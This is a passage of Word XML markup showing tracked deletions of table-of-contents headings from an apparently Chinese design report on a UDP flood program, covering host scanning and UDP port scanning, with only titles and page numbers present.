        </w:rPr>
      </w:pPr>
      <w:del w:id="714" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="715" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>3.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="716" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP Flood</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="717" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>攻击程序的基本功能</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>13</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6D9D44CA" w14:textId="226D521F" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="718" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="719" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="720" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>3.4</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="721" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP Flood</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="722" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>攻击程序的系统结构</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>14</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4564FC0F" w14:textId="004F0F60" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="723" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="724" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="725" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>3.5</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="726" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>本章小结</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>14</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4E269CE5" w14:textId="56B081B4" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="727" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="728" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="729" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="730" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>详细设计</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>15</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3A5DE80A" w14:textId="22E3A7BA" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="731" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="732" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="733" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="734" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>主机扫描</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>15</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3F9BA239" w14:textId="54AA2D6F" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="735" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="736" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="737" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.1.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="738" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>流程图</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>15</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="50AB2F56" w14:textId="09206F2E" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="739" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="740" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="741" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.1.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="742" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>主要数据</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>16</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5243CCC9" w14:textId="36ED4F67" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="743" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="744" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="745" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.1.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="746" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>主要函数</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>17</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0E140CFF" w14:textId="0833293B" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="747" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="748" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="749" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="750" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="751" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>端口扫描</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>18</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="32433B2D" w14:textId="0FC9BCE4" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="752" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="753" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="754" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.2.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="755" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>流程图</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>18</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5841EB16" w14:textId="1A8E46E6" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="756" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="757" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="758" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.2.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="759" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>主要数据</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>19</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="73E49E9B" w14:textId="0AA2B682" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="760" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="761" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="762" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.2.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="763" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>主要函数</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>20</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="24A58491" w14:textId="26E7227E" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="764" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="765" w:author="yong li" w:date="2017-05-14T10:54:00Z">
